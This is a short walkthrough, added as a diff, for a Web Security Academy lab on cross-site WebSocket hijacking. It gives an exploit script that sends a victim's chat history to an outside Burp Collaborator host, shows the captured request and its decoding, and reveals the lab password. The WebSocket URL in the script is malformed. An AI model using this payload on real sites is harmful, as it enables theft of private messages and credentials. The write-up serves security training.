@@ -1,0 +1,40 @@
+Cross-site WebSocket hijacking
+
+A multi step lab, combining different vulnerabilities.
+
+Here's how the exploit should look like:
+
+<script>
+websocket = new WebSocket('wss://https://ac521f8e1ed0cb3880811d5e00aa00ba.web-security-academy.net/chat')
+websocket.onopen = start
+websocket.onmessage = handleReply
+function start(event) {
+  websocket.send("READY");
+}
+function handleReply(event) {
+  fetch('https://6u1jnt4u8t7lc4zjsql1pislhcn2br.burpcollaborator.net/?'+event.data, {mode: 'no-cors'})
+}
+</script> 
+
+Fire up collaborator and start going through the requests. It helps if you click on the "Request to collaborator" tab and then on the "Parameters" tab.
+It's more readable. The request you're looking for looks like this:
+
+GET /?{%22user%22:%22Hal%20Pline%22,%22content%22:%22No%20problem%20carlos,%20it&apos;s%20o03pgra52jtb7yw9ap16%22} HTTP/1.1
+Host: 6u1jnt4u8t7lc4zjsql1pislhcn2br.burpcollaborator.net
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36
+Accept: */*
+Referer: https://acfd1f8e1e88cb1080111ddd012100ee.web-security-academy.net/exploit/
+Accept-Encoding: gzip, deflate, br
+
+And if you check the Parameters tab it looks like this:
+{%22user%22:%22Hal%20Pline%22,%22content%22:%22No%20problem%20carlos,%20it
+apos;s%20o03pgra52jtb7yw9ap16%22}
+
+Chuck it into a URL decoder and you should get something like this:
+
+{"user":"Hal Pline","content":"No problem carlos, it&apos;s o03pgra52jtb7yw9ap16"
+
+The password is o03pgra52jtb7yw9ap16
+
+Nicely done. Log in and claim your prize.
